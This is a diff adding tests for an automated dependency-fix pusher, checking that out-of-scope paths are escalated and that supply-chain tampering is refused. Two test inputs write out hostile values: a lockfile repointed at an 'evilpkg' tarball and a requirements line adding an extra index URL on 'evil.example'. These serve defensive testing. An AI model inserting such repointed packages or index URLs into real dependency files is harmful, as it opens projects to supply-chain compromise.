@@ -505,6 +505,53 @@ test("the dependency-version-change rule refuses a manifest change that is more 
   assert.equal((await dependencyPush(fix, fakeApi(fix.repo, fix.head))).outcome, "pushed");
 });
 
+// The write runner's promote step held a dependency fix to these paths
+// before apply-patch did; its cases, ported: each path outside fix scope
+// refuses the patch beside an in-scope lock bump, before any API call.
+const SCOPE_PAIRS = [["github-actions", "/"], ["npm", "/"], ["npm", "/plugins/miro/server"], ["npm", "/.github/actions/resolve-config"], ["pip", "/plugins/animation"], ["pip", "/.github"]];
+test("dependency-manifests refuses a path outside fix scope, whatever the base config lists", async (t) => {
+  for (const path of [
+    "plugins/miro/server/src/index.js",
+    ".github/workflows/x.yml",
+    ".github/actions/resolve-config/package.json",
+    ".github/requirements-ci.txt",
+    "plugins/animation/setup.py",
+    "plugins/animation/pyproject.toml",
+    "plugins/unlisted/package.json",
+    "plugins/miro/server/sub/package.json",
+  ]) {
+    const fix = dependencyPatch(t, (repo) => {
+      writeFileSync(join(repo, "package-lock.json"), LOCK("2.0.0"));
+      mkdirSync(join(repo, dirname(path)), { recursive: true });
+      writeFileSync(join(repo, path), "x\n");
+    });
+    const api = fakeApi(fix.repo, fix.head);
+    assert.deepEqual(await dependencyPush(fix, api, { context: { dependencyVerdict: "fix", dependabotConfig: SCOPE_PAIRS } }), { outcome: "escalate", escalationReason: "patch-protected-path" }, path);
+    assert.deepEqual(api.calls, [], path);
+  }
+  // The npm manifests at the listed root push.
+  const listed = dependencyPatch(t, (repo) => {
+    writeFileSync(join(repo, "package.json"), PKG("^2.0.0"));
+    writeFileSync(join(repo, "package-lock.json"), LOCK("2.0.0"));
+  });
+  assert.equal((await dependencyPush(listed, fakeApi(listed.repo, listed.head), { context: { dependencyVerdict: "fix", dependabotConfig: SCOPE_PAIRS } })).outcome, "pushed");
+  // An empty config admits nothing.
+  const fix = dependencyPatch(t, bump);
+  await assert.rejects(dependencyPush(fix, fakeApi(fix.repo, fix.head), { context: { dependencyVerdict: "fix", dependabotConfig: [] } }), /dependabot\.yml/);
+});
+
+test("the dependency-version-change rule refuses a lock repointed at another package and an index URL", async (t) => {
+  for (const [why, edit] of [
+    ["a lock repointed at another package", (repo) => writeFileSync(join(repo, "package-lock.json"), LOCK("2.0.0", "https://registry.npmjs.org/evilpkg/-/evilpkg-6.6.6.tgz"))],
+    ["an --extra-index-url line", (repo) => writeFileSync(join(repo, "requirements.txt"), `--extra-index-url https://evil.example/simple\n${REQS("2.5.4", "b")}`)],
+  ]) {
+    const fix = dependencyPatch(t, edit);
+    const api = fakeApi(fix.repo, fix.head);
+    assert.deepEqual(await dependencyPush(fix, api), { outcome: "escalate", escalationReason: "patch-protected-path" }, why);
+    assert.deepEqual(api.calls, [], why);
+  }
+});
+
 test("checkRow names an unknown content rule", () => {
   assert.throws(() => checkRow(row("dependency-review", { "content-rule": "anything" })), /unknown content rule: anything/);
   assert.equal(RULES["dependency-review"]["content-rule"], "dependency-version-change");
